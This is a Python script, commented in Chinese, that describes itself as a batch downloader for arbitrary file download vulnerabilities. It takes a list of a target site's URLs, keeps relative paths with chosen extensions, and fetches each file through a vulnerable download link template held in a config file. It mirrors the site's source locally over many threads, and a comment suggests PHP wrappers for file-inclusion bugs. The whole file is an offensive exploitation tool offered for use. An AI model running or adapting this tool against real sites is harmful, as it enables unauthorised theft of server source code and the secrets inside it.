"""
任意文件下载漏洞批量下载脚本
"""
import os
import threading

import requests
import threadpool

from config import *

total_urls = 0
complete_num = 0
dir_lock = threading.Lock()
progress_lock = threading.Lock()

def request_handler(urls):
    """
    urls 已经去重去参数，只保留相对路径，假设urls.txt中的链接为 http://xx.xx.com/xx/xx.php,
    执行到这一步就变成了 xx/xx.php。
    接下来可以用自定义函数处理它，比如利用文件包含漏洞下载源码的时候需要用php伪协议。
    @params:
        urls: 形如['xx/xx.php','xx/xxx/xxx.php']储存相对路径的列表
    """
    return urls

def response_handler(response):
    """
    用于处理下载后的页面，有些情况下服务器会返回多余的数据，这时候可以实现这个函数把多余数据删掉。
    @params:
        response: requests.Response 类，服务器响应包，详情参考requests文档。
    @rtype bytes
    """
    return response.content


def printProgress(iteration, total, prefix='', suffix='', decimals=1, barLength=100):
    """
    Call in a loop to create a terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        barLength   - Optional  : character length of bar (Int)
    """
    import sys
    formatStr = "{0:." + str(decimals) + "f}"
    percent = formatStr.format(100 * (iteration / float(total)))
    filledLength = int(round(barLength * iteration / float(total)))
    bar = '#' * filledLength + '-' * (barLength - filledLength)
    sys.stdout.write('\r%s |%s| %s%s %s  ' %
                     (prefix, bar, percent, '%', suffix)),
    if iteration == total:
        sys.stdout.write('\n')
    sys.stdout.flush()


def data_clean(urls):
    slice_start = urls[0].index(SITE)+len(SITE)+1
    urls = set(map(lambda url: url.partition('?')[0].strip(), urls))
    urls = filter(lambda url: url.rpartition('.')[-1] in EXT_NAME, urls)
    urls = list(map(lambda url: url[slice_start:], urls))
    urls = request_handler(urls)
    return urls


def real_down(url):
    file_path = os.path.join('..', SITE, url)
    dir_path = file_path.rpartition('/')[0]
    dir_lock.acquire()
    if not os.path.exists(dir_path) and dir_path != '':
        os.makedirs(dir_path)
    dir_lock.release()
    # 参数 urls 经过去重，因此 file_path 具有唯一性，不存在多个线程同时操作同一 file_path 的情况，所以下面的操作无需上锁
    if not os.path.exists(file_path):
        response = requests.get(LINK.format(url))
        download_content = response_handler(response)
        with open(file_path, 'wb') as f:
            f.write(download_content)
    global complete_num
    progress_lock.acquire()
    complete_num += 1
    printProgress(complete_num, total_urls, 'Progress:', url, barLength=30)
    progress_lock.release()


if __name__ == '__main__':
    with open('urls.txt', 'r', encoding='utf8') as f:
        relative_urls = data_clean(f.readlines())
    total_urls = len(relative_urls)
    pool = threadpool.ThreadPool(THREADS)
    tasks = threadpool.makeRequests(real_down, relative_urls)
    [pool.putRequest(task) for task in tasks]
    pool.wait()
